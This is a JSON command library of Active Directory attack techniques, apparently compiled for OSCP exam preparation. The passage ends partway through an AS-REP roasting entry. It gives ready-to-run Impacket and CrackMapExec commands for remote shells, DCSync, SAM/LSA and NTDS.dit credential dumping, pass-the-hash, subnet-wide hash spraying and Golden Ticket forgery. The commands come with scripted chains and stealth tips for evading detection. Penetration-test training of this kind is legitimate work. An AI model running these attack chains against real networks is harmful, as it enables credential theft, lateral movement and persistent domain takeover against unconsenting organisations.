{
  "commands": [
    {
      "id": "bloodhound-ingest",
      "name": "BloodHound - Ingest Data",
      "description": "Import SharpHound data to BloodHound",
      "command": "# Import via BloodHound GUI: Upload Data button",
      "category": "active-directory",
      "subcategory": "enumeration",
      "tags": [
        "oscp",
        "bloodhound",
        "active-directory",
        "gui"
      ],
      "prerequisites": [],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "Run pre-built queries Find attack paths"
      }
    },
    {
      "id": "bloodhound-query",
      "name": "BloodHound - Query Paths",
      "description": "Query attack paths in BloodHound",
      "command": "# Run query: 'Shortest Paths to Domain Admins'",
      "category": "active-directory",
      "subcategory": "enumeration",
      "tags": [
        "oscp",
        "bloodhound",
        "active-directory",
        "analysis"
      ],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "Follow path steps Test exploits"
      }
    },
    {
      "id": "cme-smb-users",
      "name": "CrackMapExec - Enumerate Users",
      "description": "Enumerate domain users via SMB",
      "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> --users",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target DC IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "crackmapexec",
        "active-directory",
        "enumeration"
      ],
      "next_steps": [],
      "flag_explanations": {
        "--users": "Enumerate domain users",
        "--groups": "Enumerate domain groups"
      },
      "methodology_guidance": {
        "after_success": "Build user list Password spray"
      }
    },
    {
      "id": "psexec-shell",
      "name": "Impacket PSExec - Remote Shell",
      "description": "Execute commands remotely via PSExec",
      "command": "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or NTLM hash",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "psexec",
        "active-directory",
        "lateral-movement"
      ],
      "prerequisites": [],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "Execute commands as SYSTEM"
      }
    },
    {
      "id": "smbexec-shell",
      "name": "Impacket SMBExec - Remote Shell",
      "description": "Execute commands via SMB (fileless)",
      "command": "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "smbexec",
        "active-directory",
        "lateral-movement"
      ],
      "alternatives": [
        "psexec-shell",
        "wmiexec-shell"
      ],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "Execute commands"
      }
    },
    {
      "id": "wmiexec-shell",
      "name": "Impacket WMIExec - Remote Shell",
      "description": "Execute commands via WMI (semi-interactive)",
      "command": "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "wmiexec",
        "active-directory",
        "lateral-movement"
      ],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "Execute commands"
      }
    },
    {
      "id": "secretsdump-hashes",
      "name": "Impacket SecretsDump - DCSync and Credential Dumping",
      "description": "Comprehensive credential dumping tool supporting DCSync (DRSUAPI replication), SAM/LSA dumping, and NTDS.dit extraction. Primary method for domain credential harvesting from Kali Linux.",
      "command": "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'",
      "category": "active-directory",
      "subcategory": "credential-dumping",
      "variables": [
        {
          "name": "DOMAIN",
          "description": "Domain name (NetBIOS or FQDN). Use quotes around full auth string to handle special characters in password.",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "USER",
          "description": "Admin username with appropriate rights (Domain Admin for DCSync, local admin for SAM/LSA, both for NTDS.dit extraction)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "PASS",
          "description": "Password or use -hashes :NTLM_HASH for pass-the-hash. Escape special characters (!, $) with backslash or use single quotes.",
          "example": "Password123!",
          "required": true
        },
        {
          "name": "TARGET",
          "description": "Target DC IP (for DCSync) or member server IP (for SAM/LSA). Use IP to avoid DNS issues.",
          "example": "192.168.50.70",
          "required": true
        }
      ],
      "tags": [
        "OSCP:HIGH",
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "IMPACKET",
        "POST_EXPLOITATION",
        "DOMAIN_ADMIN",
        "KALI",
        "LINUX"
      ],
      "prerequisites": [
        "ad-dcsync-check-domain-admins",
        "crackmapexec-validate-admin"
      ],
      "next_steps": [
        "hashcat-crack",
        "crackmapexec-smb-spray",
        "ad-golden-ticket-mimikatz-create"
      ],
      "alternatives": [
        "ad-dcsync-mimikatz-single-user",
        "ad-dcsync-impacket-secretsdump-user"
      ],
      "flag_explanations": {
        "-just-dc": "DCSYNC MODE - Uses DRSUAPI (Directory Replication Service API) to impersonate domain controller and request credential replication. Extracts NTLM hashes, LM hashes, Kerberos keys (AES256, AES128, DES), password history, and supplemental credentials for ALL domain users. REQUIRES: Domain Admin, Enterprise Admin, or explicit replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). OUTPUT: Full credential dump including password history and Kerberos keys. TIME: 1-10 minutes for full domain (depends on user count: 50 users ~30sec, 500 users ~5min). ADVANTAGE: Works remotely without DC access, stealthier than NTDS.dit file copy, appears as normal replication traffic. DETECTION: Event ID 4662 on DC (replication request from non-DC machine). USE CASE: Post-exploitation after obtaining Domain Admin - dump entire domain for analysis, offline cracking, and persistence planning. COMPARISON: -just-dc (full dump, slow) vs -just-dc-ntlm (NTLM only, faster) vs -just-dc-user (single user, fastest).",
        "-just-dc-ntlm": "DCSync mode with NTLM-only extraction (skips Kerberos keys, password history, supplemental credentials). FASTER than -just-dc (30-50% speed improvement) while still providing the most critical credential type (NTLM hashes). OUTPUT FORMAT: domain\\user:RID:LMhash:NThash::: - Ready for Pass-the-Hash attacks, offline cracking with Hashcat, or Golden/Silver ticket creation. TIME ESTIMATE: 30-120 seconds for typical OSCP domain (50-200 users). RECOMMENDED FOR OSCP EXAMS: Balances speed and completeness. NTLM hashes are sufficient for PTH, ticket forgery, and credential cracking - you rarely need Kerberos keys unless doing advanced AES-based attacks. MEMORY EFFICIENT: Smaller output (no verbose Kerberos data), easier to parse and store. WHEN TO USE: Time-constrained scenarios (OSCP exam), when you only need hashes for PTH/cracking, or when -just-dc is too slow on large domains.",
        "-just-dc-user <username>": "DCSync SINGLE USER - Extracts credentials for ONE specific domain account. FASTEST DCSync method (1-5 seconds). RECOMMENDED USAGE: Target high-value accounts (Administrator, krbtgt for Golden tickets, specific domain admins). STEALTH ADVANTAGE: Single-user replication is less suspicious than full domain dump (generates fewer Event ID 4662 logs, appears more like targeted query). OSCP WORKFLOW: After obtaining Domain Admin, immediately DCSync krbtgt (Golden ticket), then DCSync Administrator (backup access), then selectively DCSync other high-value targets. TROUBLESHOOTING: If username not found, verify spelling (case-insensitive but must be exact). For computer accounts, append $ (e.g., DC1$). EXAMPLE: impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:Pass123!@192.168.50.70' - Dumps ONLY krbtgt account (for Golden ticket creation).",
        "-sam": "SAM DATABASE DUMP - Extracts local account credentials from the Security Account Manager (SAM) database on target machine. REQUIRES: Local Administrator privileges on target (NOT domain admin needed). TARGET: Member servers, workstations (NOT domain controllers - DCs don't store local accounts in SAM). OUTPUT: Local account hashes (Administrator, Guest, custom local accounts). DOES NOT include domain accounts. USE CASE: Lateral movement after compromising local admin on member server - dump local admin hash, reuse across network (password reuse common). COMPARISON: -sam (local accounts) vs -just-dc (domain accounts via DCSync) vs -ntds (domain accounts via file extraction). TIME: <10 seconds. DETECTION: Reads HKLM\\SAM registry hive (Event ID 4663: Object Access). COMBINE WITH -security and -system for complete local credential dump.",
        "-security": "SECURITY HIVE DUMP - Extracts cached domain credentials, LSA secrets, and service account passwords from SECURITY registry hive. INCLUDES: Cached domain logons (last 10 domain users who logged on), LSA secrets (service account passwords, scheduled task credentials, VPN passwords), DPAPI master keys. REQUIRES: Local admin privileges. TARGET: Any Windows machine (member servers, workstations, even DCs). OUTPUT: Plaintext passwords for services, cached domain hashes (can be cracked offline). HIGH VALUE: Often reveals service account plaintext passwords (stored for services running as domain accounts), or cached domain admin credentials from previous logons. TIME: <10 seconds. COMBINE WITH -sam and -system for full local dump: impacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80",
        "-system": "SYSTEM HIVE DUMP - Extracts bootkey (system key) needed to decrypt SAM and SECURITY hive data. REQUIRED when using -sam or -security flags (SAM/SECURITY are encrypted with bootkey). TECHNICAL: Bootkey is derived from registry keys in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa (JD, Skew1, GBG, Data). Secretsdump automatically extracts bootkey and uses it to decrypt SAM/SECURITY hives. TIME: <5 seconds. USAGE: Always specify -system when using -sam or -security. EXAMPLE: impacket-secretsdump -sam -security -system corp.com/admin:pass@192.168.50.80 dumps all local credentials (SAM accounts + LSA secrets) using extracted bootkey.",
        "-ntds <ntds.dit_path>": "NTDS.DIT FILE EXTRACTION MODE - Parses an NTDS.dit database file (Active Directory database) that was previously copied from a domain controller. REQUIRES: Pre-extracted NTDS.dit file (via ntdsutil, vssadmin, or volume shadow copy), SYSTEM hive for bootkey (to decrypt NTDS.dit). WORKFLOW: 1) Create VSS snapshot on DC: vssadmin create shadow /for=C:\\, 2) Copy NTDS.dit from snapshot: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit, 3) Copy SYSTEM hive: reg save HKLM\\SYSTEM C:\\temp\\system.hive, 4) Transfer both files to Kali, 5) Parse with secretsdump: impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL. OUTPUT: ALL domain credentials (same as -just-dc DCSync). ADVANTAGE: Works offline (no network interaction, no detection), can be done from backup files. DISADVANTAGE: Requires local admin on DC (higher privilege than DCSync's domain admin), generates more forensic artifacts (file copy, VSS creation), slower workflow. WHEN TO USE: DCSync blocked/detected, have local admin on DC but not domain admin, or analyzing backup files offline.",
        "-hashes :<NTLM_HASH>": "PASS-THE-HASH AUTHENTICATION - Authenticate using NTLM hash instead of plaintext password. FORMAT: -hashes LM:NTLM or -hashes :NTLM (LM can be omitted, use empty value before colon). NTLM HASH: 32 hexadecimal characters (MD4 hash of password). ADVANTAGE: No need to crack password - use hash directly from previous dumps (LSASS, SAM, DCSync output). OSCP WORKFLOW: 1) Obtain admin NTLM hash via LSASS dump or secretsdump -sam on compromised machine, 2) Use hash for DCSync without knowing plaintext password: impacket-secretsdump -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70. TIME SAVER: Skips password cracking phase (can take hours/days if complex password). DETECTION: Identical to password auth (NTLM challenge-response), no special indicators. OPSEC: Cleaner than plaintext password in command history (less sensitive if logs captured).",
        "-k": "KERBEROS AUTHENTICATION - Use Kerberos ticket from KRB5CCNAME cache instead of password/hash. REQUIRES: Pre-obtained TGT (Ticket Granting Ticket) stored in ccache file, -no-pass flag to skip password prompt. WORKFLOW: 1) Obtain TGT via Golden Ticket (impacket-ticketer) or legitimate auth (impacket-getTGT), 2) Export ticket: export KRB5CCNAME=/tmp/admin.ccache, 3) Use ticket for DCSync: impacket-secretsdump -k -no-pass corp.com/admin@DC1.corp.com. ADVANTAGE: Stealthier than NTLM (Kerberos is preferred protocol in modern AD), bypasses NTLM restrictions (if NTLM disabled on DC). TARGET MUST BE FQDN: Kerberos uses hostname-based SPNs (DC1.corp.com, NOT 192.168.50.70). TIME SYNC CRITICAL: Kerberos requires client and DC clocks within 5 minutes (check: timedatectl). USE CASE: Advanced persistence scenarios, environments with NTLM disabled, or when you already have Golden/Silver ticket."
      },
      "success_indicators": [
        "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation'",
        "For DCSync: '[*] Using the DRSUAPI method to get NTDS.DIT secrets'",
        "For SAM: '[*] Dumping local SAM hashes'",
        "Credential lines: 'domain\\user:RID:LMhash:NThash:::' format",
        "NTLM hash format: 32 hexadecimal characters (e.g., 2892d26cdf84d7a70e2eb3b9f05c425e)",
        "Kerberos keys listed (if using -just-dc): aes256-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96",
        "Output: '[*] Cleaning up...' indicates successful completion"
      ],
      "failure_indicators": [
        "ERROR: [-] RemoteOperations failed: DCERPC Runtime Error - Insufficient permissions (not Domain/Local Admin)",
        "ERROR: [-] SMB SessionError: STATUS_LOGON_FAILURE - Wrong credentials",
        "ERROR: [-] [Errno Connection error] Connection timed out - Target unreachable or firewall blocking",
        "ERROR: [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN - Authenticating user doesn't exist",
        "ERROR: [-] User '<user>' not found - Target username not found (DCSync with -just-dc-user)"
      ],
      "troubleshooting": {
        "RemoteOperations failed / DCERPC Runtime Error": "DIAGNOSIS: Insufficient privileges. FOR DCSYNC (-just-dc/-just-dc-ntlm): Requires Domain Admin, Enterprise Admin, or replication rights. FOR SAM/LSA (-sam/-security): Requires local admin on target machine. SOLUTIONS: 1) Verify Domain Admin membership: crackmapexec smb <target> -u <user> -p <pass> --groups (look for 'Domain Admins' in output). 2) Test credentials first: crackmapexec smb <target> -u <user> -p <pass> (should show 'Pwn3d!' for admin). 3) Check if user is LOCAL admin (for SAM) vs DOMAIN admin (for DCSync): whoami /groups OR net localgroup administrators. 4) Try alternative admin account: net group \"Domain Admins\" /domain (lists all DAs). 5) If you have local admin on DC but NOT domain admin: Use -ntds flag to dump NTDS.dit file instead of DCSync.",
        "Special characters in password breaking auth": "BASH treats !, $, `, \\, \", ', &, |, ;, <, >, (, ), [, ], {, }, *, ?, ~, # as special chars. SOLUTIONS: 1) SINGLE QUOTES (recommended): impacket-secretsdump 'corp.com/admin:P@ssw0rd!@2023@192.168.50.70' - Prevents ALL bash expansion. 2) ESCAPE WITH BACKSLASH: impacket-secretsdump corp.com/admin:P@ssw0rd\\!@2023@192.168.50.70 - Escape each special char. 3) USE HASH INSTEAD: impacket-secretsdump -hashes :NTLM corp.com/admin@192.168.50.70 - Bypasses password entirely. 4) PASSWORD FILE: echo 'P@ssw0rd!@2023' > pass.txt && impacket-secretsdump corp.com/admin@192.168.50.70 < pass.txt. COMMON ERRORS: 'bash: event not found' (! without escape), 'bash: $: command not found' ($ expansion), 'bash: syntax error near unexpected token' (unmatched quotes).",
        "Connection timeout / target unreachable": "DIAGNOSIS: Network connectivity issue. REQUIRED PORTS: TCP 135 (RPC Endpoint Mapper), TCP 49152-65535 (RPC dynamic), TCP 445 (SMB), TCP 88 (Kerberos), TCP 389 (LDAP). TROUBLESHOOTING: 1) Verify target is up: ping <target_ip>. 2) Test SMB: smbclient -L //<target_ip> -U <domain>/<user>%<pass>. 3) Test RPC: nc -zv <target_ip> 135 (should show 'open'). 4) Check routing: ip route get <target_ip> (verify correct interface). 5) Verify VPN/network: ifconfig, route -n. 6) Try FQDN instead of IP: impacket-secretsdump corp.com/admin:pass@DC1.corp.com. 7) Test with alternative DC: nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.com (lists all DCs, try different IP).",
        "Parsing secretsdump output / extracting hashes": "OUTPUT FORMAT: domain\\user:RID:LMhash:NThash::: EXAMPLE: corp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: PARSING: 1) NTLM hash is 4th field (after 3rd colon): cut -d ':' -f 4. 2) LM hash is 3rd field (usually 'aad3b435b51404eeaad3b435b51404ee' = empty LM). 3) RID (Relative ID): 500=Domain Administrator, 502=krbtgt, 1000+=custom users. 4) Kerberos keys (if -just-dc used): Listed separately as 'aes256-cts-hmac-sha1-96:', 'aes128-cts-hmac-sha1-96:', 'des-cbc-md5:'. AUTOMATED EXTRACTION: impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > hashes.txt (saves all hashes to file, one per line). FOR HASHCAT: echo '2892d26cdf84d7a70e2eb3b9f05c425e' > hash.txt && hashcat -m 1000 hash.txt rockyou.txt. FOR PASS-THE-HASH: impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/Administrator@192.168.50.70."
      },
      "notes": "OSCP METHODOLOGY - COMPREHENSIVE CREDENTIAL DUMPING WITH SECRETSDUMP:\nimpacket-secretsdump is the SWISS ARMY KNIFE of credential dumping from Linux.\n\nIt supports MULTIPLE dumping methods, each with different requirements and use cases:\n**DUMPING METHODS COMPARISON:**\n\n1.\n\n**DCSYNC (-just-dc, -just-dc-ntlm, -just-dc-user):**\n   - PRIVILEGE:\nDomain Admin, Enterprise Admin, or replication rights\n   - TARGET:\nDomain Controller (remotely via DRSUAPI)\n   - ACCESS:\nRemote (no DC access needed)\n   - OUTPUT:\nDomain account credentials (all users or specific user)\n   - TIME:\n1-5 seconds per user, 30 seconds to 10 minutes for full domain\n   - FORENSICS:\nEvent ID 4662 on DC (replication request from non-DC)\n   - USE CASE:\nPost-exploitation after obtaining DA - dump krbtgt (Golden ticket), dump all domain creds for offline analysis\n\n2.\n\n**SAM DUMP (-sam -security -system):**\n   - PRIVILEGE:\nLocal Administrator on target machine\n   - TARGET:\nMember servers, workstations (NOT domain controllers)\n   - ACCESS:\nRemote (via SMB)\n   - OUTPUT:\nLocal account hashes, LSA secrets, cached domain credentials\n   - TIME:\n<10 seconds\n   - FORENSICS:\nRegistry access logs (Event ID 4663)\n   - USE CASE:\nLateral movement - dump local admin hash, check for cached domain admin credentials, extract service account passwords from LSA secrets\n\n3.\n\n**NTDS.DIT EXTRACTION (-ntds):**\n   - PRIVILEGE:\nLocal Administrator on Domain Controller\n   - TARGET:\nDomain Controller (with pre-extracted NTDS.dit file)\n   - ACCESS:\nOffline (file-based parsing)\n   - OUTPUT:\nDomain account credentials (identical to DCSync)\n   - TIME:\n30-120 seconds (parsing file, no network)\n   - FORENSICS:\nVSS creation, file copy (if extracting), offline parsing leaves no network trace\n   - USE CASE:\nHave local admin on DC but not domain admin, DCSync is blocked/detected, analyzing backup files\n\n**TYPICAL OSCP EXAM WORKFLOW:**\n\nPHASE 1:\nINITIAL ACCESS & LOCAL ADMIN\n- Compromise domain user (password spray, AS-REP roast, web exploit)\n- Escalate to local admin on compromised machine (kernel exploit, SeImpersonate, AlwaysInstallElevated)\n\nPHASE 2:\nSAM/LSA DUMP (Local Admin → Domain Admin)\n- Dump SAM/LSA:\nimpacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80\n- Check output for:\n  - Cached domain admin credentials (plaintext or hash)\n  - Service account passwords in LSA secrets\n  - Local admin hash reusable across network\n- Pass-the-hash with found credentials to higher-value targets\n\nPHASE 3:\nLATERAL MOVEMENT\n- Use CME/impacket-wmiexec to spray local admin hash across subnet\n- Find machine where domain admin is logged on\n- Dump LSASS on that machine (Mimikatz, procdump, task manager)\n- Extract domain admin NTLM hash or password\n\nPHASE 4:\nDCSYNC (Domain Admin → Full Domain Control)\n- Validate DA rights:\ncrackmapexec smb <dc_ip> -u <da_user> -H <da_hash> --groups\n- DCSync krbtgt:\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:pass@192.168.50.70'\n- Record krbtgt NTLM hash:\n4d28cf5252d39971419580a51484ca09\n- DCSync all domain users (optional):\nimpacket-secretsdump -just-dc-ntlm 'corp.com/administrator:pass@192.168.50.70' > domain_hashes.txt\n\nPHASE 5:\nPERSISTENCE\n- Golden Ticket:\nimpacket-ticketer -nthash <krbtgt_hash> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin\n- Pass-the-hash:\nStore all dumped hashes for continued access\n- Crack hashes offline:\nhashcat -m 1000 domain_hashes.txt rockyou.txt -r best64.rule\n\n**COMMAND VARIATIONS FOR DIFFERENT SCENARIOS:**\n\n# DCSync all domain users (full dump):\nimpacket-secretsdump -just-dc-ntlm 'corp.com/administrator:Pass123!@192.168.50.70'\n\n# DCSync specific user (fast, targeted):\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:Pass123!@192.168.50.70'\n\n# DCSync with Pass-the-Hash:\nimpacket-secretsdump -just-dc-ntlm -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70\n\n# Dump SAM/LSA from member server:\nimpacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80\n\n# Parse offline NTDS.dit file:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL\n\n# Kerberos auth with pre-obtained ticket:\nexport KRB5CCNAME=/tmp/admin.ccache\nimpacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.com/admin@DC1.corp.com\n\n**OUTPUT PARSING AUTOMATION:**\n\n# Extract all NTLM hashes to file:\nimpacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > all_hashes.txt\n\n# Extract specific user hash:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep 'Administrator' | cut -d ':' -f 4\n\n# Extract krbtgt hash for Golden Ticket:\nKRBTGT_HASH=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':502:' | cut -d ':' -f 4)\necho \"krbtgt hash:\n$KRBTGT_HASH\"\n\n# Batch DCSync multiple high-value targets:\nfor user in Administrator krbtgt 'Domain Admins'; do\n  echo \"[+] Dumping $user\"\n  impacket-secretsdump -just-dc-user \"$user\" 'corp.com/admin:pass@192.168.50.70' | grep ':::'\ndone\n\n# Save output with timestamp:\nimpacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' | tee dcsync_$(date +%Y%m%d_%H%M%S).txt\n\n**TIME ESTIMATES FOR OSCP EXAM:**\n\n- SAM/LSA dump (single machine):\n5-15 seconds\n- DCSync single user (krbtgt):\n2-10 seconds\n- DCSync full domain (50-200 users):\n30-120 seconds\n- NTDS.dit parsing (offline, pre-extracted file):\n30-60 seconds\n- Hash cracking (depends on complexity):\n5 minutes to several hours (run in background)\n- TOTAL (DA credentials → krbtgt hash → Golden Ticket ready):\n**<2 minutes**\n\n**DETECTION AND OPSEC:**\n\nDCSYNC DETECTION:\n- Event ID 4662 on DC:\n\"An operation was performed on an object\" with replication GUIDs\n- Source is non-DC machine (workstation/server IP, not DC IP)\n- User account performing replication (not MACHINE$ account)\n- OPSEC:\nTargeted DCSync (-just-dc-user) is stealthier than full dump (-just-dc-ntlm)\n- Timing:\nPerform during business hours (appears as normal admin activity)\n\nSAM/LSA DUMP DETECTION:\n- Event ID 4663:\nRegistry hive access (HKLM\\SAM, HKLM\\SECURITY)\n- Remote registry access from network source\n- OPSEC:\nCommon administrative activity (less suspicious than DCSync)\n\nNTDS.DIT EXTRACTION DETECTION:\n- VSS snapshot creation:\nEvent ID 8222 (Volume Shadow Copy created)\n- File access:\nNTDS.dit, SYSTEM hive (Event ID 4663)\n- Large file transfer (100MB-10GB NTDS.dit file)\n- OPSEC:\nMost forensically visible method (file artifacts, transfer logs)\n\n**COMMON MISTAKES TO AVOID:**\n\n1.\n\nNOT QUOTING AUTH STRING:\n   - WRONG:\nimpacket-secretsdump corp.com/admin:Pass123!@192.168.50.70\n   - RIGHT:\nimpacket-secretsdump 'corp.com/admin:Pass123!@192.168.50.70'\n\n2.\n\nUSING WRONG PRIVILEGE LEVEL:\n   - DCSync needs DOMAIN ADMIN, not local admin\n   - SAM dump needs LOCAL ADMIN, not domain user\n   - Verify first:\ncrackmapexec smb <target> -u <user> -p <pass> --groups\n\n3.\n\nWRONG TARGET FOR OPERATION:\n   - DCSync:\nTarget DOMAIN CONTROLLER (dc_ip)\n   - SAM dump:\nTarget MEMBER SERVER/WORKSTATION (not DC)\n   - NTDS.dit:\nUse 'LOCAL' as target (file-based, not network)\n\n4.\n\nFORGETTING TO EXTRACT KRBTGT:\n   - Always DCSync krbtgt first (Golden Ticket capability)\n   - Then dump other users if needed/time permits\n\n5.\n\nNOT TESTING CREDENTIALS BEFORE DCSYNC:\n   - Test with crackmapexec first (fast, less suspicious than failed DCSync)\n   - Failed DCSync generates Event ID 4662 (detection alert)\n\n**INTEGRATION WITH OTHER TOOLS:**\n\n# Chain:\nsecretsdump → hashcat → pass-the-hash\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt\nhashcat -m 1000 admin_hash.txt rockyou.txt --show\n# If cracked:\nimpacket-wmiexec corp.com/Administrator:'cracked_password'@192.168.50.70\n# If not cracked:\nADMIN_HASH=$(cat admin_hash.txt)\nimpacket-wmiexec -hashes :$ADMIN_HASH corp.com/Administrator@192.168.50.70\n\n# Chain:\nsecretsdump krbtgt → Golden Ticket → Full domain access\nKRBTGT=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':502:' | cut -d ':' -f 4)\nimpacket-ticketer -nthash $KRBTGT -domain corp.com -domain-sid S-1-5-21-1987370270-658905905-1781884369 -user-id 500 fakeadmin\nexport KRB5CCNAME=fakeadmin.ccache\nimpacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com\n\n# Chain:\nsecretsdump SAM → CME password spray\nimpacket-secretsdump -sam -security -system corp.com/admin:pass@192.168.50.80 | grep ':500:' | cut -d ':' -f 4 > local_admin.txt\nLOCAL_ADMIN_HASH=$(cat local_admin.txt)\ncrackmapexec smb 192.168.50.0/24 -u Administrator -H $LOCAL_ADMIN_HASH --local-auth\n\n**ALTERNATIVES AND WHEN TO USE THEM:**\n\nSECRETSDUMP vs MIMIKATZ:\n- Use secretsdump:\nFrom Kali (your primary attack platform), no AV/EDR on target, want remote execution\n- Use Mimikatz:\nAlready on Windows machine with DA, need advanced Kerberos features (ticket manipulation, skeleton key)\n\nSECRETSDUMP vs CRACKMAPEXEC:\n- Use secretsdump:\nComprehensive dump (SAM+LSA+SECURITY), DCSync capability, parse NTDS.dit files\n- Use CME:\nQuick hash dump (--sam, --lsa), spray credentials across network (--local-auth), integrated with other CME features\n\nDCSYNC vs NTDS.DIT EXTRACTION:\n- Use DCSync:\nHave domain admin, want remote operation, need speed, prefer stealth\n- Use NTDS.dit:\nHave local admin on DC (not DA), DCSync is detected/blocked, want offline analysis\n\n**FINAL OSCP EXAM TIPS:**\n\n1.\n\nCreate aliases for common commands:\n   ```bash\n   alias dcsync-krbtgt='impacket-secretsdump -just-dc-user krbtgt'\n   alias dcsync-all='impacket-secretsdump -just-dc-ntlm'\n   alias dump-sam='impacket-secretsdump -sam -security -system'\n   ```\n\n2.\n\nAlways run DCSync with output redirect:\n   ```bash\n   impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@dc_ip' | tee domain_dump.txt\n   ```\n   (Allows re-parsing without re-running if network drops)\n\n3.\n\nValidate credentials BEFORE attempting secretsdump:\n   ```bash\n   crackmapexec smb <target> -u <user> -p <pass>\n   # Output should show 'Pwn3d!' for admin\n   ```\n\n4.\n\nKeep a credential collection file:\n   ```bash\n   echo \"Administrator:2892d26cdf84d7a70e2eb3b9f05c425e\" >> creds.txt\n   echo \"krbtgt:4d28cf5252d39971419580a51484ca09\" >> creds.txt\n   ```\n\n5.\n\nTime management:\n   - If secretsdump takes >2 minutes, cancel and try alternative method\n   - Run hash cracking in background (don't wait for results before proceeding)\n   - Prioritize krbtgt (Golden Ticket) over full domain dump\n\nThis tool is the CORNERSTONE of post-exploitation credential harvesting in OSCP.\n\nMaster DCSync, SAM dumping, and NTDS.dit extraction - you'll use them in EVERY Active Directory exam machine.",
      "oscp_relevance": "high"
    },
    {
      "id": "getnpusers-asreproast",
      "name": "Impacket GetNPUsers - AS-REP Roasting",
      "description": "Extract AS-REP hashes for users without Kerberos pre-auth",
      "command": "impacket-GetNPUsers <DOMAIN>/ -usersfile <USERLIST> -dc-ip <DC_IP>",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USERLIST>",
          "description": "File with usernames",
          "example": "users.txt",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain controller IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "as-rep-roasting",
        "kerberos",
        "active-directory"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-dc-ip": "Domain controller IP",
        "-usersfile": "File containing usernames",
